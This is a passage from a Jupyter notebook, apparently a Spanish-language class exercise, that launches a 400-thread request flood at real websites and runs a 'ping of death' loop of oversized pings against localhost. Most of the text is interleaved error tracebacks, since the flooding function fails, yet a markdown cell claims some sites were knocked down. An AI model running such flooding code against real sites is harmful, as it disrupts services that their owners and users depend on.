      "  File \"C:\\Python38\\lib\\threading.py\", line 932, in _bootstrap_inner\n",
      "\n",
      "  File \"<ipython-input-1-6cee18ba0cc4>\", line 2, in ataque\n",
      "NameErrorNameErrorname 'requests' is not defined\n",
      "  File \"<ipython-input-1-6cee18ba0cc4>\", line 2, in ataque\n",
      "Exception in thread Thread-1197:\n",
      "Traceback (most recent call last):\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 932, in _bootstrap_inner\n",
      "NameError: : : name 'requests' is not defined\n",
      "    Exception in thread         self._target(*self._args, **self._kwargs)Thread-1198:\n",
      "Traceback (most recent call last):\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 932, in _bootstrap_inner\n",
      "name 'requests' is not definedNameError\n",
      "  File \"<ipython-input-1-6cee18ba0cc4>\", line 2, in ataque\n",
      "self.run()\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 870, in run\n",
      "name 'requests' is not definedException in thread Thread-1199:\n",
      "Traceback (most recent call last):\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 932, in _bootstrap_inner\n",
      "            self._target(*self._args, **self._kwargs)self._target(*self._args, **self._kwargs)\n",
      "  File \"<ipython-input-1-6cee18ba0cc4>\", line 2, in ataque\n",
      "NameError: name 'requests' is not defined\n",
      "    \n",
      "self.run()\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 870, in run\n",
      ": Exception in thread     self._target(*self._args, **self._kwargs)\n",
      "name 'requests' is not definedThread-1200:\n",
      "Traceback (most recent call last):\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 932, in _bootstrap_inner\n",
      "self.run()\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 870, in run\n",
      "    \n",
      "  File \"<ipython-input-1-6cee18ba0cc4>\", line 2, in ataque\n",
      "\n",
      "\n",
      "self.run()self.run()\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 870, in run\n",
      "  File \"<ipython-input-1-6cee18ba0cc4>\", line 2, in ataque\n",
      "\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 870, in run\n",
      "    Exception in thread self._target(*self._args, **self._kwargs)Thread-1201:\n",
      "Traceback (most recent call last):\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 932, in _bootstrap_inner\n",
      "        \n",
      "  File \"<ipython-input-1-6cee18ba0cc4>\", line 2, in ataque\n",
      "Exception in thread Thread-1202:\n",
      "Traceback (most recent call last):\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 932, in _bootstrap_inner\n",
      "self.run()    self.run()\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 870, in run\n",
      "Exception in thread NameErrorself._target(*self._args, **self._kwargs)\n",
      "        Thread-1203:\n",
      "Traceback (most recent call last):\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 932, in _bootstrap_inner\n",
      "NameError    : name 'requests' is not defined\n",
      "self._target(*self._args, **self._kwargs): name 'requests' is not defined\n",
      "\n",
      "  File \"<ipython-input-1-6cee18ba0cc4>\", line 2, in ataque\n",
      "\n",
      "  File \"<ipython-input-1-6cee18ba0cc4>\", line 2, in ataque\n",
      "NameError  File \"C:\\Python38\\lib\\threading.py\", line 870, in run\n",
      "self.run(): name 'requests' is not defined\n",
      "ataque con 400 hilos\n",
      "self._target(*self._args, **self._kwargs)\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 870, in run\n",
      "    NameError\n",
      "  File \"<ipython-input-1-6cee18ba0cc4>\", line 2, in ataque\n",
      "    self._target(*self._args, **self._kwargs)\n",
      "  File \"<ipython-input-1-6cee18ba0cc4>\", line 2, in ataque\n",
      "NameError    self._target(*self._args, **self._kwargs)    \n",
      "  File \"<ipython-input-1-6cee18ba0cc4>\", line 2, in ataque\n",
      "self.run()    NameErrorself.run()    : NameError: \n",
      "self.run()\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 870, in run\n",
      ": \n",
      "self._target(*self._args, **self._kwargs)name 'requests' is not definedname 'requests' is not defined  File \"C:\\Python38\\lib\\threading.py\", line 870, in run\n",
      "NameError      File \"C:\\Python38\\lib\\threading.py\", line 870, in run\n",
      "    : \n",
      ": name 'requests' is not defined\n",
      "\n",
      "  File \"<ipython-input-1-6cee18ba0cc4>\", line 2, in ataque\n",
      "\n",
      "name 'requests' is not defined\n",
      "self._target(*self._args, **self._kwargs)\n",
      "  File \"<ipython-input-1-6cee18ba0cc4>\", line 2, in ataque\n",
      "self.run()\n",
      "  File \"C:\\Python38\\lib\\threading.py\", line 870, in run\n",
      "NameErrorname 'requests' is not defined\n",
      ": name 'requests' is not defined\n",
      "NameErrorNameError: name 'requests' is not defined\n",
      ": name 'requests' is not defined\n",
      "        self._target(*self._args, **self._kwargs)\n",
      "  File \"<ipython-input-1-6cee18ba0cc4>\", line 2, in ataque\n",
      "        NameErrorNameErrorself._target(*self._args, **self._kwargs)\n",
      "  File \"<ipython-input-1-6cee18ba0cc4>\", line 2, in ataque\n",
      "self._target(*self._args, **self._kwargs)self._target(*self._args, **self._kwargs): name 'requests' is not defined\n",
      "\n",
      "  File \"<ipython-input-1-6cee18ba0cc4>\", line 2, in ataque\n",
      ": name 'requests' is not defined\n",
      "\n",
      "NameError: name 'requests' is not defined\n",
      "  File \"<ipython-input-1-6cee18ba0cc4>\", line 2, in ataque\n",
      "NameError    NameErrorNameError: name 'requests' is not defined: name 'requests' is not defined\n",
      ": name 'requests' is not defined\n",
      "self._target(*self._args, **self._kwargs)\n",
      "  File \"<ipython-input-1-6cee18ba0cc4>\", line 2, in ataque\n",
      "\n",
      "NameError: name 'requests' is not defined\n",
      "NameError: NameError: name 'requests' is not defined\n",
      "name 'requests' is not defined\n",
      "NameError: name 'requests' is not defined\n",
      "NameError: name 'requests' is not defined\n",
      "NameError: name 'requests' is not defined\n",
      "NameError: name 'requests' is not defined\n"
     ]
    },
    {
     "output_type": "error",
     "ename": "NameError",
     "evalue": "name 'requests' is not defined",
     "traceback": [
      "\u001b[1;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[1;31mNameError\u001b[0m                                 Traceback (most recent call last)",
      "\u001b[1;32m<ipython-input-9-54c269d27260>\u001b[0m in \u001b[0;36m<module>\u001b[1;34m\u001b[0m\n\u001b[0;32m      5\u001b[0m     \u001b[1;32mexcept\u001b[0m\u001b[1;33m:\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m      6\u001b[0m         \u001b[1;32mpass\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[1;32m----> 7\u001b[1;33m \u001b[0mprint\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0mrequests\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mget\u001b[0m\u001b[1;33m(\u001b[0m\u001b[1;34m'https://elburnout.com/'\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m",
      "\u001b[1;31mNameError\u001b[0m: name 'requests' is not defined"
     ]
    }
   ],
   "source": [
    "print('ataque con 400 hilos')\n",
    "for i in range(400):\n",
    "    try:\n",
    "        threading.Thread(target=ataque).start()\n",
    "    except:\n",
    "        pass\n",
    "print(requests.get('https://elburnout.com/'))"
   ]
  },
  {
   "source": [
    "<h1 style = \"text-align:left; color:#433789\">10. ¿Qué páginas logró tumbar?</h1>"
   ],
   "cell_type": "markdown",
   "metadata": {}
  },
  {
   "source": [
    "<p style=\"text-align:left;color:#675B7B\"> ¡Todas aquellas que no hayan devuelto un \"Request<200>\" se han tumbado! </p>\n",
    "<p style=\"text-align:left;color:#675B7B\"> Cabe destacar que el ataque de 400 hilos a elburnout no se ha podido efectuar correctamente porque la propia página ha detectado que estábamos realizando 400 requests de acceso a su dominio desde la misma ip en muy poco tiempo y ha decidido cortar la conexión.</p>"
   ],
   "cell_type": "markdown",
   "metadata": {}
  },
  {
   "source": [
    "<h1 style = \"text-align:left; color:#433789\">11. Lance un ataque de 20 hilos con el ping de la muerte al equipo de un compañero </h1>"
   ],
   "cell_type": "markdown",
   "metadata": {}
  },
  {
   "cell_type": "code",
   "execution_count": 57,
   "metadata": {},
   "outputs": [
    {
     "output_type": "stream",
     "name": "stdout",
     "text": [
      "ataque con 20 hilos y el pin de la muerte\n",
      "\n",
      "Haciendo ping a DESKTOP-9E31NLE [::1] con 65500 bytes de datos:\n",
      "Respuesta desde ::1: tiempo<1m \n",
      "\n",
      "Estad�sticas de ping para ::1:\n",
      "    Paquetes: enviados = 1, recibidos = 1, perdidos = 0\n",
      "    (0% perdidos),\n",
      "Tiempos aproximados de ida y vuelta en milisegundos:\n",
      "    M�nimo = 0ms, M�ximo = 0ms, Media = 0ms\n",
      "\n",
      "Haciendo ping a DESKTOP-9E31NLE [::1] con 65500 bytes de datos:\n",
      "Respuesta desde ::1: tiempo<1m \n",
      "\n",
      "Estad�sticas de ping para ::1:\n",
      "    Paquetes: enviados = 1, recibidos = 1, perdidos = 0\n",
      "    (0% perdidos),\n",
      "Tiempos aproximados de ida y vuelta en milisegundos:\n",
      "    M�nimo = 0ms, M�ximo = 0ms, Media = 0ms\n",
      "\n",
      "Haciendo ping a DESKTOP-9E31NLE [::1] con 65500 bytes de datos:\n",
      "Respuesta desde ::1: tiempo<1m \n",
      "\n",
      "Estad�sticas de ping para ::1:\n",
      "    Paquetes: enviados = 1, recibidos = 1, perdidos = 0\n",
      "    (0% perdidos),\n",
      "Tiempos aproximados de ida y vuelta en milisegundos:\n",
      "    M�nimo = 0ms, M�ximo = 0ms, Media = 0ms\n",
      "\n",
      "Haciendo ping a DESKTOP-9E31NLE [::1] con 65500 bytes de datos:\n",
      "Respuesta desde ::1: tiempo<1m \n",
      "\n",
      "Estad�sticas de ping para ::1:\n",
      "    Paquetes: enviados = 1, recibidos = 1, perdidos = 0\n",
      "    (0% perdidos),\n",
      "Tiempos aproximados de ida y vuelta en milisegundos:\n",
      "    M�nimo = 0ms, M�ximo = 0ms, Media = 0ms\n",
      "\n",
      "Haciendo ping a DESKTOP-9E31NLE [::1] con 65500 bytes de datos:\n",
      "Respuesta desde ::1: tiempo<1m \n",
      "\n",
      "Estad�sticas de ping para ::1:\n",
      "    Paquetes: enviados = 1, recibidos = 1, perdidos = 0\n",
      "    (0% perdidos),\n",
      "Tiempos aproximados de ida y vuelta en milisegundos:\n",
      "    M�nimo = 0ms, M�ximo = 0ms, Media = 0ms\n",
      "\n",
      "Haciendo ping a DESKTOP-9E31NLE [::1] con 65500 bytes de datos:\n",
      "Respuesta desde ::1: tiempo<1m \n",
      "\n",
      "Estad�sticas de ping para ::1:\n",
      "    Paquetes: enviados = 1, recibidos = 1, perdidos = 0\n",
      "    (0% perdidos),\n",
      "Tiempos aproximados de ida y vuelta en milisegundos:\n",
      "    M�nimo = 0ms, M�ximo = 0ms, Media = 0ms\n",
      "\n",
      "Haciendo ping a DESKTOP-9E31NLE [::1] con 65500 bytes de datos:\n",
      "Respuesta desde ::1: tiempo<1m \n",
      "\n",
      "Estad�sticas de ping para ::1:\n",
      "    Paquetes: enviados = 1, recibidos = 1, perdidos = 0\n",
      "    (0% perdidos),\n",
      "Tiempos aproximados de ida y vuelta en milisegundos:\n",
      "    M�nimo = 0ms, M�ximo = 0ms, Media = 0ms\n",
      "\n",
      "Haciendo ping a DESKTOP-9E31NLE [::1] con 65500 bytes de datos:\n",
      "Respuesta desde ::1: tiempo<1m \n",
      "\n",
      "Estad�sticas de ping para ::1:\n",
      "    Paquetes: enviados = 1, recibidos = 1, perdidos = 0\n",
      "    (0% perdidos),\n",
      "Tiempos aproximados de ida y vuelta en milisegundos:\n",
      "    M�nimo = 0ms, M�ximo = 0ms, Media = 0ms\n",
      "\n",
      "Haciendo ping a DESKTOP-9E31NLE [::1] con 65500 bytes de datos:\n",
      "Respuesta desde ::1: tiempo<1m \n",
      "\n",
      "Estad�sticas de ping para ::1:\n",
      "    Paquetes: enviados = 1, recibidos = 1, perdidos = 0\n",
      "    (0% perdidos),\n",
      "Tiempos aproximados de ida y vuelta en milisegundos:\n",
      "    M�nimo = 0ms, M�ximo = 0ms, Media = 0ms\n",
      "\n",
      "Haciendo ping a DESKTOP-9E31NLE [::1] con 65500 bytes de datos:\n",
      "Respuesta desde ::1: tiempo<1m \n",
      "\n",
      "Estad�sticas de ping para ::1:\n",
      "    Paquetes: enviados = 1, recibidos = 1, perdidos = 0\n",
      "    (0% perdidos),\n",
      "Tiempos aproximados de ida y vuelta en milisegundos:\n",
      "    M�nimo = 0ms, M�ximo = 0ms, Media = 0ms\n",
      "\n",
      "Haciendo ping a DESKTOP-9E31NLE [::1] con 65500 bytes de datos:\n",
      "Respuesta desde ::1: tiempo<1m \n",
      "\n",
      "Estad�sticas de ping para ::1:\n",
      "    Paquetes: enviados = 1, recibidos = 1, perdidos = 0\n",
      "    (0% perdidos),\n",
      "Tiempos aproximados de ida y vuelta en milisegundos:\n",
      "    M�nimo = 0ms, M�ximo = 0ms, Media = 0ms\n",
      "\n",
      "Haciendo ping a DESKTOP-9E31NLE [::1] con 65500 bytes de datos:\n",
      "Respuesta desde ::1: tiempo<1m \n",
      "\n",
      "Estad�sticas de ping para ::1:\n",
      "    Paquetes: enviados = 1, recibidos = 1, perdidos = 0\n",
      "    (0% perdidos),\n",
      "Tiempos aproximados de ida y vuelta en milisegundos:\n",
      "    M�nimo = 0ms, M�ximo = 0ms, Media = 0ms\n",
      "\n",
      "Haciendo ping a DESKTOP-9E31NLE [::1] con 65500 bytes de datos:\n",
      "Respuesta desde ::1: tiempo<1m \n",
      "\n",
      "Estad�sticas de ping para ::1:\n",
      "    Paquetes: enviados = 1, recibidos = 1, perdidos = 0\n",
      "    (0% perdidos),\n",
      "Tiempos aproximados de ida y vuelta en milisegundos:\n",
      "    M�nimo = 0ms, M�ximo = 0ms, Media = 0ms\n",
      "\n",
      "Haciendo ping a DESKTOP-9E31NLE [::1] con 65500 bytes de datos:\n",
      "Respuesta desde ::1: tiempo<1m \n",
      "\n",
      "Estad�sticas de ping para ::1:\n",
      "    Paquetes: enviados = 1, recibidos = 1, perdidos = 0\n",
      "    (0% perdidos),\n",
      "Tiempos aproximados de ida y vuelta en milisegundos:\n",
      "    M�nimo = 0ms, M�ximo = 0ms, Media = 0ms\n",
      "\n",
      "Haciendo ping a DESKTOP-9E31NLE [::1] con 65500 bytes de datos:\n",
      "Respuesta desde ::1: tiempo<1m \n",
      "\n",
      "Estad�sticas de ping para ::1:\n",
      "    Paquetes: enviados = 1, recibidos = 1, perdidos = 0\n",
      "    (0% perdidos),\n",
      "Tiempos aproximados de ida y vuelta en milisegundos:\n",
      "    M�nimo = 0ms, M�ximo = 0ms, Media = 0ms\n",
      "\n",
      "Haciendo ping a DESKTOP-9E31NLE [::1] con 65500 bytes de datos:\n",
      "Respuesta desde ::1: tiempo<1m \n",
      "\n",
      "Estad�sticas de ping para ::1:\n",
      "    Paquetes: enviados = 1, recibidos = 1, perdidos = 0\n",
      "    (0% perdidos),\n",
      "Tiempos aproximados de ida y vuelta en milisegundos:\n",
      "    M�nimo = 0ms, M�ximo = 0ms, Media = 0ms\n",
      "\n",
      "Haciendo ping a DESKTOP-9E31NLE [::1] con 65500 bytes de datos:\n",
      "Respuesta desde ::1: tiempo<1m \n",
      "\n",
      "Estad�sticas de ping para ::1:\n",
      "    Paquetes: enviados = 1, recibidos = 1, perdidos = 0\n",
      "    (0% perdidos),\n",
      "Tiempos aproximados de ida y vuelta en milisegundos:\n",
      "    M�nimo = 0ms, M�ximo = 0ms, Media = 0ms\n",
      "\n",
      "Haciendo ping a DESKTOP-9E31NLE [::1] con 65500 bytes de datos:\n",
      "Respuesta desde ::1: tiempo<1m \n",
      "\n",
      "Estad�sticas de ping para ::1:\n",
      "    Paquetes: enviados = 1, recibidos = 1, perdidos = 0\n",
      "    (0% perdidos),\n",
      "Tiempos aproximados de ida y vuelta en milisegundos:\n",
      "    M�nimo = 0ms, M�ximo = 0ms, Media = 0ms\n",
      "\n",
      "Haciendo ping a DESKTOP-9E31NLE [::1] con 65500 bytes de datos:\n",
      "Respuesta desde ::1: tiempo<1m \n",
      "\n",
      "Estad�sticas de ping para ::1:\n",
      "    Paquetes: enviados = 1, recibidos = 1, perdidos = 0\n",
      "    (0% perdidos),\n",
      "Tiempos aproximados de ida y vuelta en milisegundos:\n",
      "    M�nimo = 0ms, M�ximo = 0ms, Media = 0ms\n",
      "\n",
      "Haciendo ping a DESKTOP-9E31NLE [::1] con 65500 bytes de datos:\n",
      "Respuesta desde ::1: tiempo<1m \n",
      "\n",
      "Estad�sticas de ping para ::1:\n",
      "    Paquetes: enviados = 1, recibidos = 1, perdidos = 0\n",
      "    (0% perdidos),\n",
      "Tiempos aproximados de ida y vuelta en milisegundos:\n",
      "    M�nimo = 0ms, M�ximo = 0ms, Media = 0ms\n"
     ]
    }
   ],
   "source": [
    "print('ataque con 20 hilos y el pin de la muerte')\n",
    "for i in range(20):\n",
    "    ! ping localhost -l 65500 -w 1 -n 1"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "name": "python385jvsc74a57bd02db524e06e9f5f4ffedc911c917cb75e12dbc923643829bf417064a77eb14d37",
   "display_name": "Python 3.8.5 64-bit"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.5"
  },
  "metadata": {
   "interpreter": {
    "hash": "2db524e06e9f5f4ffedc911c917cb75e12dbc923643829bf417064a77eb14d37"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}